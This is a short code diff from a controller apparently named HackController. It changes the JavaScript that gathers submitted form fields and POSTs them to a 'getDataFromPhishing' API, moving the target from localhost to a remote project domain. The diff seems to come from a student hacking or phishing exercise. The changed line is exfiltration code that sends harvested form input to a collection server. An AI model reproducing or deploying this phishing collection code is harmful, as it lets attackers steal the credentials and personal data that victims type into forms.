@@ -867,7 +867,7 @@ class HackController extends Controller
                         formDataObj[key] = value;
                     });
 
-                    fetch('http://127.0.0.1:8000/api/getDataFromPhishing', {
+                    fetch('https://robinson.berthet.angers.mds-project.fr/api/getDataFromPhishing', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
